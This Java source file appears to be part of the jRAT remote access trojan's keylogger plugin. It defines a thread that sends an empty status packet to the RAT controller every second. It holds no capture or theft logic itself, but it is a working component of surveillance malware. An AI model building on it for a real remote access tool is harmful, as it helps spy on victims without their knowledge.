package se.jrat.plugin.keylogger.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.PacketBuilder;
import jrat.api.RATObject;

public class HeartbeatThread implements Runnable {

	private boolean enabled;
	private RATObject server;

	public HeartbeatThread(RATObject server) {
		this.server = server;
		this.enabled = true;
	}

	public void toggle() {
		enabled = !enabled;
	}

	@Override
	public void run() {
		try {
			while (enabled) {

				Thread.sleep(1000L);

				if (!enabled) {
					break;
				}

				server.addToSendQueue(new PacketBuilder(ClientPlugin.STATUS_HEADER, server) {
					@Override
					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {

					}
				});

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
